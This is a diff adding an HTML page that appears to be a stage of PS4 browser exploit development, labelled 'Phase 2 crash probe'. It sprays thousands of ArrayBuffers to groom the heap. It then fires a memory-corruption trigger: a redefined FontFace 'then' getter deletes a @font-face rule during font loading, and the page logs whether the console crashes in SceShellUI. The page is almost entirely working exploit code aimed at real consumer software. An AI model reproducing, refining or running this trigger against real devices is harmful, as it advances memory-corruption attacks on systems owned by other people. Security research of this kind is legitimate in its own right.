@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Phase 2 — Crash probe</title>
+<style>
+body { font-family: monospace; background: #111; color: #0f0; padding: 12px; }
+#status { font-size: 18px; margin-bottom: 8px; }
+#log { height: 80vh; overflow: auto; border: 1px solid #333; padding: 8px; font-size: 12px; }
+</style>
+<style id="s">
+@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
+</style>
+</head>
+<body>
+<div id="status">running crash probe...</div>
+<div id="log"></div>
+<script>
+(function () {
+    var logEl = document.getElementById('log');
+    var statusEl = document.getElementById('status');
+    window.ps4log = function (msg) {
+        var line = document.createElement('div');
+        line.textContent = '[' + performance.now().toFixed(1) + 'ms] ' + msg;
+        logEl.appendChild(line);
+    };
+    window.ps4status = function (msg, color) {
+        statusEl.textContent = msg;
+        if (color) statusEl.style.color = color;
+    };
+})();
+
+/*
+ * Phase 2 goal: run minimal trigger N times and log timing.
+ * If crash is timing-sensitive, some iterations may behave differently.
+ * After each run attempt, note CE-36329-3 on PS4.
+ *
+ * Also sprays ArrayBuffers before trigger to test if heap layout affects crash.
+ */
+
+var SPRAY = 5000;
+var RUNS = 5;
+
+function spray() {
+    var bufs = [];
+    for (var i = 0; i < SPRAY; i++) {
+        bufs.push(new ArrayBuffer(0x1000));
+    }
+    ps4log('sprayed ' + SPRAY + ' x 4KB ArrayBuffers');
+    return bufs;
+}
+
+function minimalTrigger() {
+    var A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+    document.fonts.add(A);
+    void A.loaded;
+
+    var fired = false;
+    Object.defineProperty(FontFace.prototype, 'then', {
+        configurable: true,
+        get: function () {
+            if (!fired && this === A) {
+                fired = true;
+                ps4log('then getter fired');
+                document.getElementById('s').sheet.deleteRule(0);
+                document.body.offsetTop;
+            }
+            return undefined;
+        }
+    });
+
+    document.fonts.load('1em x', 'AB');
+}
+
+window.onload = function () {
+    ps4log('Phase 2 crash probe');
+    ps4log('UA: ' + navigator.userAgent);
+    ps4log('Runs: ' + RUNS + ', spray: ' + SPRAY);
+
+    var keep = [];
+    for (var run = 0; run < RUNS; run++) {
+        ps4log('--- run ' + (run + 1) + '/' + RUNS + ' ---');
+        keep.push(spray());
+        minimalTrigger();
+        ps4log('trigger dispatched for run ' + (run + 1));
+    }
+
+    ps4status('survived all ' + RUNS + ' runs', '#0f0');
+    ps4log('If you see this, page survived — crash may be single-shot or needs fresh page');
+    ps4log('Check PS4 error log for CE-36329-3 / SIGSEGV in SceShellUI');
+};
+</script>
+</body>
+</html>
